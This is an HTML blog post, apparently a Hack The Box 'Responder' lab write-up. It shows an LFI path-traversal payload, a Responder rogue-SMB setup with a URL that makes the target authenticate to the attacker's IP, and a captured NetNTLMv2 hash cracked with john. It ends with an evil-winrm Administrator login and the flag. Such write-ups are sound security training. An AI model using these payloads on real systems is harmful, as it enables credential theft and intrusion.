@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>HTB-Responder | Yuchen Blog</title>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.100.1" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="keywords" content="lfi, rfi, ntlm, winrm">
+<meta name="description" content="This box is about “File Inclusion” and “NTLM”.
+A File Inclusion vulnerability on a webpage being served on a windows machine can be exploited to collect …">
+<link rel="stylesheet" type="text/css" media="screen" href="/css/normalize.css" />
+<link rel="stylesheet" type="text/css" media="screen" href="/css/main.css" />
+<link rel="stylesheet" type="text/css" media="screen" href="/css/all.css" /><link rel="stylesheet" href="/css/katex.css" crossorigin="anonymous">
+<script defer src="/js/katex.js"  integrity="sha384-HELAAZU8xvHgfT/8z4Mhmu+E2z3oBrMEuywaMh/CEd5uTZIDSct7TEaX+S43+dOi" crossorigin="anonymous"></script>
+<script defer src="/js/auto-render.js" integrity="sha384-0QrOZ8WIARJUoT5pH7Iuzi7iq0mXUXLF9yj5ZvYxTkMRv1zcaPQiOQ9ksHYbKw7M" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+<script>
+document.addEventListener("DOMContentLoaded", function() { renderMathInElement(document.body, { delimiters: [ {left: "$$", right: "$$", display: true}, {left: "$", right: "$", display: false} ] }); });
+</script>
+
+
+
+
+<meta property="og:title" content="HTB-Responder" />
+<meta property="og:description" content="This box is about &ldquo;File Inclusion&rdquo; and &ldquo;NTLM&rdquo;.
+A File Inclusion vulnerability on a webpage being served on a windows machine can be exploited to collect the NetNTMLv2 challenge of the user that is running the web server.
+Then, we use Responder to capture the NetNTLMv2 hash and use john the ripper to crack it.
+Scan ┌──(kali㉿kali)-[~/htb] └─$ nmap -p- -T5 10.129.133.83 Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-31 16:50 EDT Nmap scan report for 10." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ych3r.github.io/posts/htb-responder/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-06-08T17:57:51-04:00" />
+<meta property="article:modified_time" content="2022-06-08T17:57:51-04:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB-Responder"/>
+<meta name="twitter:description" content="This box is about &ldquo;File Inclusion&rdquo; and &ldquo;NTLM&rdquo;.
+A File Inclusion vulnerability on a webpage being served on a windows machine can be exploited to collect the NetNTMLv2 challenge of the user that is running the web server.
+Then, we use Responder to capture the NetNTLMv2 hash and use john the ripper to crack it.
+Scan ┌──(kali㉿kali)-[~/htb] └─$ nmap -p- -T5 10.129.133.83 Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-31 16:50 EDT Nmap scan report for 10."/>
+
+<meta itemprop="name" content="HTB-Responder">
+<meta itemprop="description" content="This box is about &ldquo;File Inclusion&rdquo; and &ldquo;NTLM&rdquo;.
+A File Inclusion vulnerability on a webpage being served on a windows machine can be exploited to collect the NetNTMLv2 challenge of the user that is running the web server.
+Then, we use Responder to capture the NetNTLMv2 hash and use john the ripper to crack it.
+Scan ┌──(kali㉿kali)-[~/htb] └─$ nmap -p- -T5 10.129.133.83 Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-31 16:50 EDT Nmap scan report for 10."><meta itemprop="datePublished" content="2022-06-08T17:57:51-04:00" />
+<meta itemprop="dateModified" content="2022-06-08T17:57:51-04:00" />
+<meta itemprop="wordCount" content="963">
+<meta itemprop="keywords" content="lfi,rfi,ntlm,winrm," />
+</head>
+<body>
+<header>
+<div id="titletext">
+<h2 id="titleonly"><a href="https://ych3r.github.io/">Yuchen Blog</a></h2>
+</div>
+<div id="title-social">
+<div id="social">
+<nav><ul>
+<li><a href="https://github.com/ych3r"><i title="Github" class="icons fab fa-github"></i></a></li>
+<li><a><i title="Switch Dark Mode" class="dark-mode icons fas fa-moon"></i></a></li>
+</ul></nav>
+</div>
+</div>
+<div id="mainmenu">
+<nav>
+<ul>
+<li><a href="/">Home</a></li>
+<li><a href="/posts">All Posts</a></li>
+<li><a href="/about">About</a></li>
+<li><a href="/tags">Tags</a></li>
+<li><a href="/categories">Categories</a></li>
+</ul>
+</nav>
+</div>
+</header>
+<main>
+<div class="post">
+<article>
+<div class="post-header">
+<div class="meta">
+<div class="date">
+<span class="day">08</span>
+<span class="rest">Jun 2022</span>
+</div>
+</div>
+<div class="matter">
+<h1 class="title">HTB-Responder</h1>
+<p class="post-meta">
+<span class="post-meta">
+
+&nbsp;<i class="fas fa-clock"></i>&nbsp;5&nbsp;minutes
+
+
+ 
+&nbsp;| &nbsp;
+
+<i class="fas fa-book"></i>&nbsp;963&nbsp;words
+
+
+
+
+</span>
+
+</p>
+</div>
+</div>
+<div class="markdown">
+<p>This box is about &ldquo;File Inclusion&rdquo; and &ldquo;NTLM&rdquo;.</p>
+<p>A File Inclusion vulnerability on a webpage being served on a windows
+machine can be exploited to collect the NetNTMLv2 challenge of the user
+that is running the web server.</p>
+<p>Then, we use <code>Responder</code> to capture the NetNTLMv2 hash and use <code>john  the ripper</code> to crack it.</p>
+<h3 id="scan">Scan</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -p- -T5 10.129.133.83 
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-05-31 16:50 EDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.133.83
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.017s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65532</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>80/tcp   open  http
+</span></span><span style="display:flex;"><span>5985/tcp open  wsman
+</span></span><span style="display:flex;"><span>7680/tcp open  pando-pub
+</span></span></code></pre></div><p>Port 5985 is for WinRM(aka. Windows Remote Management). It&rsquo;s a
+Windows-native built-in remote management protocol.
+It allows the user to:</p>
+<ul>
+<li>Remotely communicate and interface with hosts</li>
+<li>Execute commands remotely on systems that are not local to you but are
+network accessible</li>
+<li>Monitor, manage and configure servers, operating systems and client
+machines from a remote location</li>
+</ul>
+<p>WinRM can get us a Powershell shell, but first, we need the credentials.</p>
+<h3 id="enumerate-web-app">Enumerate Web App</h3>
+<p>As we open the browser and search <code>[target ip]</code>, it will say that
+unable to find that site. That&rsquo;s because the website has redirected the
+browser to a new url and our host doesn&rsquo;t know how to find it.</p>
+<p>That&rsquo;s called <strong>Name-Based Virtual hosting</strong>. It hosts multiple domain
+names on a single server.</p>
+<p>The <code>/etc/hosts</code> file is used to resolve a hostname into an IP
+address, so we need to put ip and url into it. Then, it will enable the
+browser to resolve the hostname and include the HTTP header in every HTTP
+request.</p>
+<p>Then open it in browser.</p>
+<p><figure>
+  <img src="/img/htb/responder/webpage.png" alt="webpage"  />
+</figure></p>
+<p>There&rsquo;s a URL parameter used to load different language versions of the
+webpage. <code>http://unika.htb/index.php?page=french.html</code></p>
+<p>It uses <code>page</code> parameter which may potentially be vulnerable to Local
+File Inclusion vulnerability. A common example is when an application uses
+the path to a file as input.</p>
+<p>Let&rsquo;s try to see if there&rsquo;s a Local File Include vulnerability. We will
+test with commonly known files.
+<code>http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts</code></p>
+<p><figure>
+  <img src="/img/htb/responder/lfi.png" alt="lfi"  />
+</figure></p>
+<p>The file inclusion, in this case, was made possible because in the backend
+the <code>include()</code> method of PHP is being used to process the URL
+parameter <code>page</code> for serving a different webpage for different
+languages. And no proper sanitization is being done on the <code>page</code>
+parameter.</p>
+<h3 id="responder-challenge-capture">Responder Challenge Capture</h3>
+<p>If we select a protocol like SMB, Windows will try to authenticate to our
+machine, and we can capture the NetNTLMv2.</p>
+<p><strong>NTLM</strong> is a collection of authentication protocols created by Microsoft.
+It&rsquo;s a challenge-response authentication protocol used to authenticate a
+client to a resource on an Active Directory domain.</p>
+<p>The NTLM authentication process:</p>
+<ul>
+<li>Client sends the user name and domain name to the server</li>
+<li>Server generates a random character string, referred to as the challenge</li>
+<li>Client encrypts the challenge with the NTLM hash of the user password
+and sends it back to the server</li>
+<li>Server retrieves the user password</li>
+<li>Server uses the hash value retrieved from the security account database
+to encrypt the challenge string. The value is then compared to the value
+received from the client. If the values match, the client is authenticated</li>
+</ul>
+<p><strong>NTHash</strong> aka. NTLM hash, is the output of the algorithm used to store
+passwords on Windows systems in the SAM database and on domain
+controllers.</p>
+<p>In this case, even if &ldquo;allow_url_include&rdquo;(php.ini) is set to &ldquo;Off&rdquo;, PHP
+will not prevent the loading of SMB URLs. We can misuse this functionality
+to steal the NTLM hash.</p>
+<p><strong>Responder</strong>, for this scenario, can set up a malicious SMB server. When
+the target machine attempts to perform the NTLM authentication to that
+server, Responder sends a challenge back for the server to encrypt with
+the user&rsquo;s password. When the server responds, Responder will use the
+challenge and the encrypted response to generate the NetNTLMv2. Then we
+could try to crack the hash.</p>
+<p>In <code>Responder.conf</code>, make sure &ldquo;SMB&rdquo; server is On. Set &ldquo;HTTP&rdquo; to Off.</p>
+<ul>
+<li>default system install: /usr/share/responder/Responder.conf</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/responder<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo responder -I tun0                    
+</span></span><span style="display:flex;"><span>                                         __
+</span></span><span style="display:flex;"><span>  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+</span></span><span style="display:flex;"><span>  |   _|  -__|__ --|  _  |  _  |     |  _  <span style="color:#f92672">||</span>  -__|   _|
+</span></span><span style="display:flex;"><span>  |__| |_____|_____|   __|_____|__|__|_____<span style="color:#f92672">||</span>_____|__|
+</span></span><span style="display:flex;"><span>                   |__|
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>           NBT-NS, LLMNR &amp; MDNS Responder 3.1.1.0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Author: Laurent Gaffie <span style="color:#f92672">(</span>laurent.gaffie@gmail.com<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  To kill this script hit CTRL-C
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Poisoners:
+</span></span><span style="display:flex;"><span>    LLMNR                      <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    NBT-NS                     <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    MDNS                       <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    DNS                        <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    DHCP                       <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Servers:
+</span></span><span style="display:flex;"><span>    HTTP server                <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    HTTPS server               <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    WPAD proxy                 <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    Auth proxy                 <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    SMB server                 <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    &lt;SNIP&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Listening <span style="color:#66d9ef">for</span> events...                                                                                         
+</span></span></code></pre></div><p>While <code>sudo responder -I tun0</code>, try
+<code>http://unika.htb/index.php?page=//10.10.15.233/test.txt</code>.</p>
+<p>This means we tell the server to include a resource from our SMB server.</p>
+<h3 id="hash-cracking">Hash Cracking</h3>
+<p>Yes, we received a NetNTLM for Administrator. Use john to crack it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Client   : ::ffff:10.129.133.83
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Username : RESPONDER<span style="color:#ae81ff">\A</span>dministrator
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Hash     : 
+</span></span><span style="display:flex;"><span>Administrator::RESPONDER:1383b0de10246165:58C9499A416F36063639759E3B1B840C:01010000000000008024AC581175D8017B4993E4DA3BF5020000000002000800390047003500360001001E00570049004E002D005A003100550041004B0050004100430044003000500004003400570049004E002D005A003100550041004B005000410043004400300050002E0039004700350036002E004C004F00430041004C000300140039004700350036002E004C004F00430041004C000500140039004700350036002E004C004F00430041004C00070008008024AC581175D801060004000200000008003000300000000000000001000000002000000E532660E0B3E94A0A95DD8868A6245D0A434AF2FD783C430BCA957151CBB81F0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003200330033000000000000000000
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/responder<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo 
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;Administrator::RESPONDER:01c2103350fe1a94:84BBC05A3FA53BA54C982A7D4F70110C:0101000000000000803CA3C59F79D801CD456A8246E9F0880000000002000800390046003300570001001E00570049004E002D003100500059005A00320036004D00460055004300430004003400570049004E002D003100500059005A00320036004D0046005500430043002E0039004600330057002E004C004F00430041004C000300140039004600330057002E004C004F00430041004C000500140039004600330057002E004C004F00430041004C0007000800803CA3C59F79D801060004000200000008003000300000000000000001000000002000001F4C5BD2D0203B049F3CE9FD4861BABD7E5F284480775C0A7E8A942F5DDAC24C0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380030000000000000000000&#34;</span> 
+</span></span><span style="display:flex;"><span>&gt; hash.txt
+</span></span><span style="display:flex;"><span>                                                                                                                    
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/responder<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ john -w<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt hash.txt
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>netntlmv2, NTLMv2 C/R <span style="color:#f92672">[</span>MD4 HMAC-MD5 32/64<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">4</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>badminton        <span style="color:#f92672">(</span>Administrator<span style="color:#f92672">)</span>     
+</span></span><span style="display:flex;"><span>1g 0:00:00:00 DONE <span style="color:#f92672">(</span>2022-06-06 12:23<span style="color:#f92672">)</span> 50.00g/s 204800p/s 204800c/s 
+</span></span><span style="display:flex;"><span>204800C/s slimshady..oooooo
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show --format=netntlmv2&#34;</span> options to display all of the cracked 
+</span></span><span style="display:flex;"><span>passwords reliably
+</span></span><span style="display:flex;"><span>Session completed.
+</span></span></code></pre></div><h3 id="winrm-login">WinRM Login</h3>
+<p>We&rsquo;ll connect to the WinRM service. We&rsquo;ll be using
+<a href="https://github.com/Hackplayers/evil-winrm" target="_blank">evil-winrm</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/responder<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -p <span style="color:#ae81ff">5985</span> -sC -sV unika.htb
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-06-06 12:25 EDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> unika.htb <span style="color:#f92672">(</span>10.129.189.216<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.013s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/responder<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ evil-winrm -u Administrator -p <span style="color:#e6db74">&#39;badminton&#39;</span> -i 10.129.189.216
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.3
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: 
+</span></span><span style="display:flex;"><span>quoting_detection_proc<span style="color:#f92672">()</span> <span style="color:#66d9ef">function</span> is unimplemented on this machine
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM Github: 
+</span></span><span style="display:flex;"><span>https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt;
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>ike<span style="color:#ae81ff">\D</span>esktop&gt; type flag.txt
+</span></span><span style="display:flex;"><span>ea81b7afddd03efaa0945333ed147fac
+</span></span></code></pre></div>
+</div>
+<div class="tags">
+<div class="taxosfloating_left">
+<p>Categories</p>
+</div>
+<div class="termsfloating_right">
+<p>
+<a href="/categories/writeups/">writeups</a>
+</p>
+</div>
+<div class="clearit"></div>
+<div class="tags">
+<div class="taxosfloating_left">
+<p>Tags</p>
+</div>
+<div class="termsfloating_right">
+<p>
+<a href="/tags/lfi/">lfi</a>
+<a href="/tags/ntlm/">ntlm</a>
+<a href="/tags/rfi/">rfi</a>
+<a href="/tags/winrm/">winrm</a>
+</p>
+</div>
+<div class="clearit"></div>
+</div>
+</article>
+</div>
+</main>
+<footer>
+© Yuchen Liu 2022
+</footer><script src="/js/dark-mode.js"></script>
+
+</body>
+</html>
